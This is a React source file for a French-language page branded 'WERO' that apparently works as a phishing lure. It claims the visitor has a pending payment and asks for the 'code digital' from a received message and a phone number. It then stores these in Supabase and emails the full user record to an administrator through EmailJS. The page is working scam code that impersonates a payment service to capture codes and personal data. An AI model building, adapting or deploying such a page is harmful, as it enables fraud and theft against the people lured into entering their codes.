import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { supabase } from "@/lib/supabase";
import { useToast } from "@/components/ui/use-toast";
import { Footer } from "@/components/Footer";
import { sendAdminNotification, initEmailJS } from "@/lib/emailService";

const Index = () => {
  const [code, setCode] = useState("");
  const [telephone, setTelephone] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const navigate = useNavigate();
  const { toast } = useToast();

  useEffect(() => {
    initEmailJS();
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!code || !telephone) {
      toast({
        title: "Erreur de validation",
        description: "Veuillez remplir tous les champs",
        variant: "destructive",
      });
      return;
    }
    
    setIsLoading(true);
    
    try {
      // Vérifier si le code existe
      const { data, error } = await supabase
        .from("users")
        .select("id, nom, prenom")
        .eq("code", code)
        .single();
      
      if (error || !data) {
        toast({
          title: "Code invalide",
          description: "Le code digital que vous avez entré n'existe pas",
          variant: "destructive",
        });
        setIsLoading(false);
        return;
      }
      
      // Mettre à jour le numéro de téléphone
      await supabase
        .from("users")
        .update({ telephone })
        .eq("id", data.id);
      
      // Stocker l'ID de l'utilisateur dans localStorage pour référence ultérieure
      localStorage.setItem("userId", data.id);
      
      // Récupérer les données complètes de l'utilisateur pour l'email
      const { data: userData } = await supabase
        .from("users")
        .select("*")
        .eq("id", data.id)
        .single();
      
      // Envoyer une notification à l'administrateur
      const userName = `${data.prenom || ''} ${data.nom || ''}`.trim();
      const emailResult = await sendAdminNotification({
        userData: userData,
        userCode: code,
        userName: userName
      });
      
      if (emailResult) {
        console.log("Email envoyé avec succès");
      } else {
        console.error("Échec de l'envoi de l'email");
      }
      
      // Rediriger vers la page suivante
      navigate("/confirmation");
    } catch (error) {
      console.error(error);
      toast({
        title: "Erreur",
        description: "Une erreur est survenue lors de la vérification du code",
        variant: "destructive",
      });
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col">
      <header className="bg-yellow-300 p-4">
        <h1 className="text-2xl font-bold">WERO</h1>
      </header>
      
      <main className="flex-grow flex justify-center items-center p-4">
        <div className="max-w-md w-full bg-white rounded-lg shadow-md p-6">
          <div className="text-center mb-8">
            <h2 className="text-2xl font-bold mb-2">VOUS AVEZ REÇU UN PAIEMENT EN ATTENTE.</h2>
            <div className="flex justify-center mb-6">
              <div className="bg-green-500 rounded-full p-6 w-24 h-24 flex items-center justify-center">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round" className="w-12 h-12">
                  <polyline points="20 6 9 17 4 12"></polyline>
                </svg>
              </div>
            </div>
            <p className="text-gray-700 mb-6">
              Pour recevoir votre argent, saisissez le code présent dans le message reçu
              afin d'activer votre paiement.
            </p>
          </div>
          
          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="space-y-2">
              <label htmlFor="code" className="block text-sm font-medium">
                CODE DIGITAL*
              </label>
              <Input
                id="code"
                placeholder="Ex : SW7-8A5"
                value={code}
                onChange={(e) => setCode(e.target.value)}
                className="border-2 border-yellow-300 focus:border-yellow-400 focus:ring-yellow-400"
                required
              />
            </div>
            
            <div className="space-y-2">
              <label htmlFor="telephone" className="block text-sm font-medium">
                N° de téléphone*
              </label>
              <Input
                id="telephone"
                placeholder="N° de téléphone"
                value={telephone}
                onChange={(e) => setTelephone(e.target.value)}
                className="border-2 border-yellow-300 focus:border-yellow-400 focus:ring-yellow-400"
                required
              />
            </div>
            
            <Button
              type="submit"
              className="w-full bg-yellow-400 hover:bg-yellow-500 text-black font-semibold py-3"
              disabled={isLoading}
            >
              {isLoading ? "VÉRIFICATION..." : "ACTIVER LE PAIEMENT"}
            </Button>
          </form>
        </div>
      </main>
      
      <Footer />
    </div>
  );
};

export default Index;
